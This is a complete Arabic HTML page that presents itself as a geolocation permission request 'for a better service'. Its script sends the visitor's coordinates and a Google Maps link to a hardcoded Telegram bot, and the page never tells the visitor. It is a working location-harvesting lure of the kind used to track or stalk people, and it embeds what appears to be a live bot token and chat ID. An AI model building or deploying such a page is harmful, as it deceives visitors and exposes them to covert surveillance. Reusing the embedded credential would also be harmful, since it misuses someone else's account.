<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>طلب إذن الموقع الجغرافي</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            text-align: center;
            padding: 50px;
            background-color: #f5f5f5;
        }
        .container {
            background-color: white;
            padding: 30px;
            border-radius: 10px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
            max-width: 500px;
            margin: 0 auto;
        }
        button {
            background-color: #0088cc;
            color: white;
            border: none;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 20px;
        }
        button:hover {
            background-color: #006699;
        }
        #status {
            margin-top: 20px;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>طلب إذن الوصول إلى الموقع الجغرافي</h1>
        <p>هذا التطبيق يحتاج إلى إذنك للوصول إلى موقعك الجغرافي لتقديم خدمة أفضل.</p>
        <button id="requestBtn">السماح بالوصول إلى الموقع</button>
        <div id="status"></div>
    </div>

    <script>
        document.getElementById('requestBtn').addEventListener('click', function() {
            const statusElement = document.getElementById('status');
            statusElement.textContent = 'جاري طلب الإذن...';
            
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        const latitude = position.coords.latitude;
                        const longitude = position.coords.longitude;
                        statusElement.textContent = 'تم الحصول على الموقع بنجاح!';
                        
                        // إرسال الموقع إلى بوت تلجرام
                        sendToTelegramBot(latitude, longitude);
                    },
                    function(error) {
                        let errorMessage;
                        switch(error.code) {
                            case error.PERMISSION_DENIED:
                                errorMessage = "تم رفض طلب الوصول إلى الموقع الجغرافي.";
                                break;
                            case error.POSITION_UNAVAILABLE:
                                errorMessage = "معلومات الموقع غير متاحة.";
                                break;
                            case error.TIMEOUT:
                                errorMessage = "انتهى وقت طلب الموقع.";
                                break;
                            case error.UNKNOWN_ERROR:
                                errorMessage = "حدث خطأ غير معروف.";
                                break;
                        }
                        statusElement.textContent = errorMessage;
                    }
                );
            } else {
                statusElement.textContent = "المتصفح لا يدعم خدمة الموقع الجغرافي.";
            }
        });

        function sendToTelegramBot(latitude, longitude) {
            const statusElement = document.getElementById('status');
            
            // استبدل هذه القيم بمعلومات بوتك
            const botToken = '7512390719:AAHuHzUgshfHoqS-kkjzKxYrHFI0gHlWlsU';
            const chatId = '7327464581';
            
            const message = `تم استلام موقع جديد:
الخط العرضي: ${latitude}
الخط الطولي: ${longitude}
رابط خرائط جوجل: https://www.google.com/maps?q=${latitude},${longitude}`;
            
            const url = `https://api.telegram.org/bot${botToken}/sendMessage`;
            
            fetch(url, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    chat_id: chatId,
                    text: message
                })
            })
            .then(response => response.json())
            .then(data => {
                if (data.ok) {
                    statusElement.textContent += ' تم إرسال الموقع إلى بوت تلجرام بنجاح!';
                } else {
                    statusElement.textContent += ' فشل في إرسال الموقع إلى بوت تلجرام.';
                }
            })
            .catch(error => {
                statusElement.textContent += ' خطأ في الاتصال بالإنترنت.';
                console.error('Error:', error);
            });
        }
    </script>
</body>
</html>
